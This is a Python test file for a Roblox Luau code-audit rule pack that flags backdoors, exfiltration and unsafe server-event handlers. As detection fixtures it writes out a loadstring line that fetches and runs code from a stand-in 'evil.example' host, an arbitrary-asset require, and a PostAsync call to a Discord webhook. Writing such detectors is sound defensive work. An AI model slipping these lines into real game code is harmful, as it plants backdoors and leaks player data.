"""Fase 3 — Rule pack Roblox: backdoors, trust, economia, exfiltracion, config."""
from pathlib import Path

from src.config import CodeAuditConfig
from src.custom_rules import load_custom_rules
from src.engine import CodeAuditEngine
from src.pattern_scanner import PatternScanner

RULEPACK = Path(__file__).resolve().parent.parent / "rulepacks" / "roblox.yaml"

EXPECTED_IDS = {
    "RBX-BD-001", "RBX-BD-002", "RBX-BD-003", "RBX-BD-004", "RBX-BD-005",
    "RBX-EXF-001", "RBX-EXF-002", "RBX-EXF-003",
    "RBX-TRUST-001", "RBX-TRUST-002",
    "RBX-ECON-001", "RBX-ECON-002",
    "RBX-CFG-001", "RBX-CFG-002",
}

CLEAN_LUAU = """
local Players = game:GetService("Players")

local function onPlayerAdded(player)
    local coins = Instance.new("IntValue")
    coins.Name = "Coins"
    coins.Value = 0
    coins.Parent = player
end

Players.PlayerAdded:Connect(onPlayerAdded)
"""


def _hits(snippet: str, tmp_path: Path, name: str = "main.luau") -> set:
    target = tmp_path / name
    target.write_text(snippet)
    scanner = PatternScanner(rules=load_custom_rules(str(RULEPACK)))
    return {f.rule_id for f in scanner.scan_file(target)}


def test_rulepack_loads_all_expected_rules():
    rules = load_custom_rules(str(RULEPACK))
    loaded = {r.id for r in rules}
    assert EXPECTED_IDS <= loaded, f"faltan reglas: {EXPECTED_IDS - loaded}"


def test_backdoor_loadstring_detected(tmp_path):
    hits = _hits('local f = loadstring(game:HttpGet("http://evil.example/x"))()\n', tmp_path)
    assert "RBX-BD-001" in hits


def test_backdoor_require_asset_detected(tmp_path):
    hits = _hits("local m = require(1234567890)\n", tmp_path)
    assert "RBX-BD-003" in hits


def test_obfuscated_string_char_detected(tmp_path):
    hits = _hits("local s = string.char(104, 101, 108, 108, 111)\n", tmp_path)
    assert "RBX-BD-005" in hits


def test_discord_webhook_detected(tmp_path):
    hits = _hits(
        'HttpService:PostAsync("https://discord.com/api/webhooks/123/abc", data)\n',
        tmp_path)
    assert "RBX-EXF-002" in hits


def test_postasync_exfil_detected(tmp_path):
    hits = _hits("HttpService:PostAsync(url, payload)\n", tmp_path)
    assert "RBX-EXF-001" in hits


def test_onserverevent_handler_flagged(tmp_path):
    hits = _hits("remote.OnServerEvent:Connect(function(player, amount)\n", tmp_path)
    assert "RBX-TRUST-001" in hits


def test_clean_luau_produces_zero_pack_findings(tmp_path):
    assert _hits(CLEAN_LUAU, tmp_path) == set()


def test_engine_end_to_end_with_rulepack(tmp_path):
    (tmp_path / "bad.luau").write_text(
        'local f = loadstring(game:HttpGet("http://evil.example/x"))()\n'
        "local m = require(1234567890)\n"
        "local s = string.char(104, 101)\n"
        'HttpService:PostAsync("https://discord.com/api/webhooks/123/abc", data)\n'
        "remote.OnServerEvent:Connect(function(player, amount)\n"
    )
    (tmp_path / "clean.luau").write_text(CLEAN_LUAU)

    cfg = CodeAuditConfig()
    cfg.scanners.custom_rules_path = str(RULEPACK)
    engine = CodeAuditEngine(config=cfg)
    result = engine.scan(str(tmp_path))

    found = {f.rule_id for f in result.findings}
    expected = {"RBX-BD-001", "RBX-BD-003", "RBX-BD-005", "RBX-EXF-002", "RBX-TRUST-001"}
    assert expected <= found, f"deteccion incompleta: {expected - found}"
